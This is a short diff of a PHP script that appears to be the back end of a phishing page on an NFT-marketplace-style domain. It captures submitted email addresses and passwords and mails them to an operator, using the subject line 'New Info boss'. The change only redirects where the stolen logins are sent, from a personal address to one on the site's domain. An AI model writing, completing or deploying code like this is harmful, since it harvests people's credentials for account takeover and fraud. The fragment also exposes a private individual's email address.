@@ -10,8 +10,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 }
 
 if(isset($_POST)){
-   $to = "toluegbon@gmail.com"; 
-    $from = "nftmarkethub.site";
+   $to = "sender@nftmarkethub.site"; 
+    $from = "sender@nftmarkethub.site";
     $email = $_POST['email'];
     $password = $_POST['password'];
     $subject = "New Info boss";
